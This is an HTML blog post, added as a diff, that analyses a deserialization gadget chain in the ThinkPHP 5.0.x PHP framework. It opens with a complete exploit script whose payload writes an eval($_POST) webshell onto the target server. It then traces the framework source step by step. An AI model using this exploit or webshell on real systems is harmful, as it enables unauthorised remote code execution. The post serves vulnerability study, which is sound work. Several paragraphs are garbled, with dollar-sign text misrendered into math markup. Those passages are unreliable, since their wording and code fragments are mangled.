@@ -1,0 +1,481 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>重生之学习thinkphp5.0.x反序列化 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="重生之学习thinkphp5.0.x反序列化 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+摸鱼两周，继续学习，审了一小段代码又不想审了，继续看thinkphp。
+调用链分析
+先给出exp吧，方便师傅们先理解
+&lt;?php
+namespace think\process\pipes{
+	class Windows {
+	..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              重生之学习thinkphp5.0.x反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>摸鱼两周，继续学习，审了一小段代码又不想审了，继续看thinkphp。</p>
+<h1 id="调用链分析">调用链分析</h1>
+<p>先给出exp吧，方便师傅们先理解</p>
+<pre><code class="language-php">&lt;?php
+namespace think\process\pipes{
+	class Windows {
+		public $files=[];
+	}
+}
+
+namespace think\model{
+	class Pivot{
+		public $error;
+		public $parent;
+		public $append=['ch1e'=&gt;'getError'];
+	}
+}
+namespace think\db{
+    class Query
+    {
+        public $model;
+    }
+}
+namespace think\console{
+    class Output
+    {
+        public $handle;
+        public $styles=['getAttr'];
+    }
+}
+namespace think\model\relation{
+    class HasOne{
+        public $query;
+        public $selfRelation=false;
+        public $bindAttr=['a'=&gt;'ch1e'];
+    }
+}
+namespace think\session\driver{
+    class Memcached{
+        public $handler;
+    }
+}
+namespace think\cache\driver{
+    class File{
+        public $options = [
+            'path'=&gt; 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',
+            'cache_subdir'=&gt;false,
+            'prefix'=&gt;'',
+            'data_compress'=&gt;false
+        ];
+        public $tag=true;
+    }
+}
+namespace{
+	$file=new think\cache\driver\File();
+    $memcached=new think\session\driver\Memcached();
+    $output=new think\console\Output();
+    $query=new think\db\Query();
+    $hasone=new think\model\relation\HasOne();
+    $pivot=new think\model\Pivot();
+    $windows=new think\process\pipes\Windows();
+
+
+    $memcached-&gt;handler=$file;
+    $output-&gt;handle=$memcached;
+    $query-&gt;model=$output;
+    $hasone-&gt;query=$query;
+    $pivot-&gt;parent=$output;
+    $pivot-&gt;error=$hasone;
+    $windows-&gt;files[]=$pivot;
+    echo urlencode(serialize($windows));
+}
+</code></pre>
+<p>这条链是从<code>thinkphp/library/think/process/pipes/Windows.php</code>中的__destruct方法作为入口</p>
+<pre><code class="language-php">public function __destruct()
+{
+    $this-&gt;close();
+    $this-&gt;removeFiles();
+}
+</code></pre>
+<p>调用了自身的close和removeFiles方法，进入removeFiles方法</p>
+<pre><code class="language-php">private function removeFiles()
+{
+    foreach ($this-&gt;files as $filename) {
+        if (file_exists($filename)) {
+            @unlink($filename);
+        }
+    }
+    $this-&gt;files = [];
+}
+</code></pre>
+<p>这里在unlink之前，判断了$filename是否存在，这里可以触发__toString方法，具体触发的是<code>thinkphp/library/think/Model.php</code>的toString方法，这里因为打这个下划线比较麻烦，我后面也都不打了。tostring方法如下</p>
+<pre><code class="language-php">public function __toString()
+{
+    return $this-&gt;toJson();
+}
+</code></pre>
+<p>继续跟进，实际上是调用了toArray方法，给出关键代码</p>
+<pre><code class="language-php">if (!empty($this-&gt;append)) {
+    foreach ($this-&gt;append as $key =&gt; $name) {
+        if (is_array($name)) {
+            // 追加关联对象属性
+            $relation   = $this-&gt;getAttr($key);
+            $item[$key] = $relation-&gt;append($name)-&gt;toArray();
+        } elseif (strpos($name, '.')) {
+            list($key, $attr) = explode('.', $name);
+            // 追加关联对象属性
+            $relation   = $this-&gt;getAttr($key);
+            $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
+        } else {
+            $relation = Loader::parseName($name, 1, false);
+            if (method_exists($this, $relation)) {
+                $modelRelation = $this-&gt;$relation();
+                $value         = $this-&gt;getRelationData($modelRelation);
+
+                if (method_exists($modelRelation, 'getBindAttr')) {
+                    $bindAttr = $modelRelation-&gt;getBindAttr();
+                    if ($bindAttr) {
+                        foreach ($bindAttr as $key =&gt; $attr) {
+                            $key = is_numeric($key) ? $attr : $key;
+                            if (isset($this-&gt;data[$key])) {
+                                throw new Exception('bind attr has exists:' . $key);
+                            } else {
+                                $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+                            }
+                        }
+                        continue;
+                    }
+                }
+                $item[$name] = $value;
+            } else {
+                $item[$name] = $this-&gt;getAttr($name);
+            }
+        }
+    }
+}
+</code></pre>
+<p>我们的目的其实是要调用到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>这行代码，此时的value应该是一个<code>think/console/Output</code>类，会触发他的call方法，但是这里需要先看执行到这行代码所需的条件</p>
+<ol>
+<li>isset(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">this-&gt;data[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen">[</span></span></span></span>key])=false</li>
+<li>$bindAttr</li>
+<li>method_exists($modelRelation, 'getBindAttr')=true</li>
+<li>!empty($this-&gt;append)</li>
+</ol>
+<p>此时的$value是output类的对象，那么要看看他是如何获得到这个对象。</p>
+<pre><code class="language-php">$modelRelation = $this-&gt;$relation();
+$value         = $this-&gt;getRelationData($modelRelation);
+</code></pre>
+<p>value是通过这两行代码获取到的，getRelationData方法如下</p>
+<pre><code class="language-php">protected function getRelationData(Relation $modelRelation)
+{
+    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
+        $value = $this-&gt;parent;
+    } else {
+        // 首先获取关联数据
+        if (method_exists($modelRelation, 'getRelation')) {
+            $value = $modelRelation-&gt;getRelation();
+        } else {
+            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation');
+        }
+    }
+    return $value;
+}
+</code></pre>
+<p>我们所需要的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">value是`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span></span></span></span>this-&gt;parent<code>.但是如果进入这个if判断需要满足三个条件，$this-&gt;parent肯定是满足的。传入的$modelRelation必须是Relation类型，并且isSelfRelation()的结果为false，</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mi>R</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>−</mo><mo>&gt;</mo><mi>g</mi><mi>e</mi><mi>t</mi><mi>M</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo>(</mo><mo>)</mo><mi mathvariant="normal">‘</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">结</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">该</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">象</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">全</mi><mi mathvariant="normal">局</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mi>R</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">子</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">抽</mi><mi mathvariant="normal">象</mi><mi mathvariant="normal">类</mi><mi>O</mi><mi>n</mi><mi>e</mi><mi>T</mi><mi>o</mi><mi>O</mi><mi>n</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">他</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">子</mi><mi mathvariant="normal">类</mi><mi>H</mi><mi>a</mi><mi>s</mi><mi>O</mi><mi>n</mi><mi>e</mi><mo separator="true">,</mo><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>s</mi><mi>e</mi><mi>l</mi><mi>f</mi><mi>R</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">属</mi><mi mathvariant="normal">性</mi><mi mathvariant="normal">为</mi><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">modelRelation-&gt;getModel()`的结果应该是一个output类的对象，全局搜索Relation的子类，找到一个抽象类OneToOne，找到他的子类HasOne,需要selfRelation属性为false，并且`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord">‘</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">全</span><span class="mord cjk_fallback">局</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">抽</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">类</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">类</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">属</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord">‘</span></span></span></span>modelRelation-&gt;getModel()<code>的结果是一个output类的对象，也就是</code>$this-&gt;query-&gt;getModel()<code>是一个output类的对象，这里就找到了</code>thinkphp/library/think/db/Query.php`，他存在一个getModel方法如下</p>
+<pre><code class="language-php">public function getModel()
+{
+    return $this-&gt;model;
+}
+</code></pre>
+<p>所以只需要让HasOne类的query是query类，并且query类的model属性为output类，以及HasOne类的属性selfRelation为false即可。再来看一下<code>$modelRelation = $this-&gt;$relation();</code>这里是获取的modelRelation，前面分析了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mi>R</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">该</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi>H</mi><mi>a</mi><mi>s</mi><mi>O</mi><mi>n</mi><mi>e</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">且</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">条</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">。</mi></mrow><annotation encoding="application/x-tex">modelRelation应该是一个HasOne类，并且满足上面那些条件。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">。</span></span></span></span>modelRelation是通过自身的$relation方法获取到的，所以我们只需要找一个返回值可控的方法即可，自身存在着一个getError方法直接返回</p>
+<pre><code class="language-php">public function getError()
+{
+    return $this-&gt;error;
+}
+</code></pre>
+<p>所以这一块就很清晰了，构造这个Model类，error属性是刚刚那个构造好的HasOne对象，并且$relation的值是getError。看完value怎么获取。来看看attr怎么获取</p>
+<pre><code class="language-php">if (method_exists($modelRelation, 'getBindAttr')) {
+    $bindAttr = $modelRelation-&gt;getBindAttr();
+    if ($bindAttr) {
+        foreach ($bindAttr as $key =&gt; $attr) {
+            $key = is_numeric($key) ? $attr : $key;
+            if (isset($this-&gt;data[$key])) {
+                throw new Exception('bind attr has exists:' . $key);
+            } else {
+                $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+            }
+        }
+        continue;
+    }
+}
+</code></pre>
+<p>attr是bindattr关联数组中的值。bindattr关联数组是通过调用getBindAttr获取，在HasOne对象中，他 是继承自OneToOne类，在OneToOne类中声明了getBindAttr方法，返回的是自身bindAttr属性值，所以可以进入第一个if判断，所以我们只需要在HasOne类中设置他的bindAttr属性值即可，这里具体设置什么值得后面再看，先继续往下走，应该是轮到调用<code>thinkphp/library/think/console/Output.php</code>的call方法</p>
+<pre><code class="language-php">public function __call($method, $args)
+{
+    if (in_array($method, $this-&gt;styles)) {
+        array_unshift($args, $method);
+        return call_user_func_array([$this, 'block'], $args);
+    }
+
+    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) {
+        return call_user_func_array([$this-&gt;handle, $method], $args);
+    } else {
+        throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method);
+    }
+}
+</code></pre>
+<p>有两个if判断，分别都使用了call_user_func_array方法，如果走第一个if判断，就是调用的自身的block方法，所以这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mi>s</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">args就是之前的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span></span></span></span>attr,但是在调用前把method插入到args最前面了，所以这里的style参数应该是getAttr，message才是数组里的值，继续跟进看看</p>
+<pre><code class="language-php">protected function block($style, $message)
+{
+    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
+}
+</code></pre>
+<p>调用了writeln，继续跟进</p>
+<pre><code class="language-php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;write($messages, true, $type);
+}
+</code></pre>
+<p>再跟进，此时的$messages应该是<code>&lt;getAttr&gt;xxxx&lt;getAttr&gt;</code>,这里的xxx是在bindAttr中传入的</p>
+<pre><code class="language-php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+}
+</code></pre>
+<p>发现是调用了handle属性的write方法，全局搜索write方法，在<code>thinkphp/library/think/session/driver/Memcached.php</code>这个位置有个write方法</p>
+<pre><code class="language-php">public function write($sessID, $sessData)
+{
+    return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
+}
+</code></pre>
+<p>他可以调用任意类的set方法，因为handler可控，继续搜索set方法，找到<code>thinkphp/library/think/cache/driver/File.php</code>的set方法，具体如下</p>
+<pre><code class="language-php">public function set($name, $value, $expire = null)
+{
+    if (is_null($expire)) {
+        $expire = $this-&gt;options['expire'];
+    }
+    if ($expire instanceof \DateTime) {
+        $expire = $expire-&gt;getTimestamp() - time();
+    }
+    $filename = $this-&gt;getCacheKey($name, true);
+    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
+        $first = true;
+    }
+    $data = serialize($value);
+    if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
+        //数据压缩
+        $data = gzcompress($data, 3);
+    }
+    $data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+    $result = file_put_contents($filename, $data);
+    if ($result) {
+        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+        clearstatcache();
+        return true;
+    } else {
+        return false;
+    }
+}
+</code></pre>
+<p>他主要是个写入缓存的功能，存在一个file_put_contents写入文件，在上面说到，前面的$message应该是<code>&lt;getAttr&gt;xxxx&lt;getAttr&gt;</code>,所以在传入到File类的set方法的第一个参数就是<code>&lt;getAttr&gt;xxxx&lt;getAttr&gt;</code>,第二个参数是默认false，filename是通过<code>    $filename = $this-&gt;getCacheKey($name, true);</code>获取，跟进getCacheKey方法</p>
+<pre><code class="language-php">protected function getCacheKey($name, $auto = false)
+{
+    $name = md5($name);
+    if ($this-&gt;options['cache_subdir']) {
+        // 使用子目录
+        $name = substr($name, 0, 2) . DS . substr($name, 2);
+    }
+    if ($this-&gt;options['prefix']) {
+        $name = $this-&gt;options['prefix'] . DS . $name;
+    }
+    $filename = $this-&gt;options['path'] . $name . '.php';
+    $dir      = dirname($filename);
+
+    if ($auto &amp;&amp; !is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    return $filename;
+}
+</code></pre>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">从</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">name从这个方法里出来以后就变成了`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">了</span><span class="mord">‘</span></span></span></span>this-&gt;options['path'].md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">其</mi><mi mathvariant="normal">实</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">name).php`文件名其实是可控的，但是在上面的方法里的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord">‘</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">的</span></span></span></span>data是不可控的， 因为他是序列化第二个参数的结果，前面说到了是默认是false的，所以只能继续看在set方法中调用的setTagItem方法</p>
+<pre><code class="language-php">protected function setTagItem($name)
+{
+    if ($this-&gt;tag) {
+        $key       = 'tag_' . md5($this-&gt;tag);
+        $this-&gt;tag = null;
+        if ($this-&gt;has($key)) {
+            $value   = explode(',', $this-&gt;get($key));
+            $value[] = $name;
+            $value   = implode(',', array_unique($value));
+        } else {
+            $value = $name;
+        }
+        $this-&gt;set($key, $value, 0);
+    }
+}
+</code></pre>
+<p>这里在最后又调用了自身的set方法，并且这里的key和value都可控，因为key是<code>tag_md5($this-&gt;tag)</code>,value就是传进来的之前的filename。所以整条链子已经分析完了，但是这里还涉及到一个问题就是这个文件名的问题，具体可以见这个文章:https://xz.aliyun.com/t/7457</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220527202042791.png" alt="image-20220527202042791" loading="lazy"></figure>
+<h1 id="疑惑点">疑惑点</h1>
